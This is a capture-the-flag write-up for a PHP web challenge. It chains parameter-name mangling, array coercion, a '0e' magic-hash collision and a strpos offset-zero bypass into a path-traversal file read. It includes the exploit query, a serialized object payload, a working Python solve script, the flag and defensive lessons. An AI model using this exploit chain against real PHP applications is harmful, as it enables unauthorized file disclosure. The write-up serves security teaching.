# FortID CTF 2026 Writeup: Ultimative PHP

- **Category:** Web
- **Challenge author:** dsantl
- **Points / Solves:** 122 pts / 128 solves
- **Flag:** `FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_3d6e8aee50}`

---

## Challenge

> The Ultimative Corporation is retiring its legacy identity platform. One final
> all-in-one migration form verifies administrator access, recovery answers, a
> dual-format migration code, and an exported PHP profile.
>
> The developers insist that every individual check is secure. Complete the
> migration and recover the flag.

---

## Summary

A PHP migration gateway runs four independent-looking checks in one request.
Each check is individually bypassable: PHP's `$_GET` key mangling, "Array"
string coercion, the classic `0e` numeric-string loose comparison, and a
`strpos()` used as a boolean. Chaining all four lets the imported profile
object read `/tmp/flag`.

## Solution

### Step 1: Read the deployed source and identify the four checks

`src/index.php` (PHP 8.3, deployed with `php -S`, `display_errors=Off`)
requires, in order:

1. `$_GET['access_level'] === 'administrator'`, while the raw query string is
   rejected if `rawurldecode(QUERY_STRING)` **contains** `access_level`.
2. `$primary` and `$backup` of the same `get_debug_type`, strictly different,
   with identical `sha256('legacy-recovery:v1:' . $value)`.
3. `$code` (`strlen <= 64`) with `substr(md5(m),0,9) !== substr(sha256(m),0,9)`
   but `==` — i.e. a PHP loose-comparison collision.
4. `$_GET['profile']` = Base64url PHP serialization, and the final page prints
   `(string) $profile` for a `MigratedProfile`.

The flag lives at `/tmp/flag` (symlinked as `/flag`), unreadable from the webroot
without traversal.

### Step 2: Defeat each check

* **access_level** — PHP converts `.` (and spaces) to `_` in external variable
  names. `access.level=administrator` becomes `$_GET['access_level']`, but the
  raw query string contains `access.level`, so the blacklist never matches.
* **recovery answers** — send both as arrays: `primary[]=one&backup[]=two`.
  `get_debug_type()` is `array` for both, the arrays differ (`!==` passes), and
  `'legacy-recovery:v1:' . $array` stringifies to `"Array"` for both, so the
  fingerprints are identical.
* **compatibility code** — brute force a code whose MD5 *and* SHA-256 first 9
  hex chars are both `0e` + 7 decimal digits. PHP 8 compares two numeric strings
  numerically: `"0e1194662" == "0e8095192"` is `0 == 0`, while `!==` still sees
  different strings. Found `code=c68218860` (md5 `0e1194662…`, sha256
  `0e8095192…`); `solve.py --brute` re-derives it.
* **profile** — `LegacyTemplate::__toString()` guards with
  `if (strpos($this->template, '../'))`. `strpos()` returns `0` when the match
  starts at offset 0, and `0` is falsy, so a template that *begins* with `../`
  skips the filter. `../../../../tmp/flag` resolves to `/tmp/flag`.

Serialized profile (base64url-encoded into `profile`):

```text
O:15:"MigratedProfile":1:{s:11:"displayName";O:14:"LegacyTemplate":1:{s:8:"template";s:20:"../../../../tmp/flag";}}
```

### Step 3: One request

```python
#!/usr/bin/env python3
# solve.py (abridged; full script in solve.py)
import base64, http.client, re, ssl

template = "../../../../tmp/flag"
inner = 'O:14:"LegacyTemplate":1:{s:8:"template";s:%d:"%s";}' % (len(template), template)
profile = base64.urlsafe_b64encode(
    ('O:15:"MigratedProfile":1:{s:11:"displayName";%s}' % inner).encode()
).decode().rstrip("=")

query = ("access.level=administrator"
         "&primary[]=one&backup[]=two"
         "&code=c68218860"
         "&profile=" + profile)

conn = http.client.HTTPSConnection(HOST, 443, context=ssl._create_unverified_context())
conn.request("GET", "/?" + query)
body = conn.getresponse().read().decode()
print(re.search(r'<p class="flag">([^<]*)</p>', body).group(1))
```

```text
$ python3 solve.py <host> 443
[*] compatibility code: c68218860
FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_3d6e8aee50}
```

## Flag

```text
FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_3d6e8aee50}
```

## Lessons

* Blacklisting *encoded text* misses normalization performed later by the
  runtime (`.` -> `_` in `$_GET` keys).
* Weak typing: `array-to-string` coercion and `0e…` numeric-string juggling
  defeat digest equality checks that look strong on paper.
* `strpos()` in a boolean context treats offset-0 matches as absent; always
  compare with `!== false`.
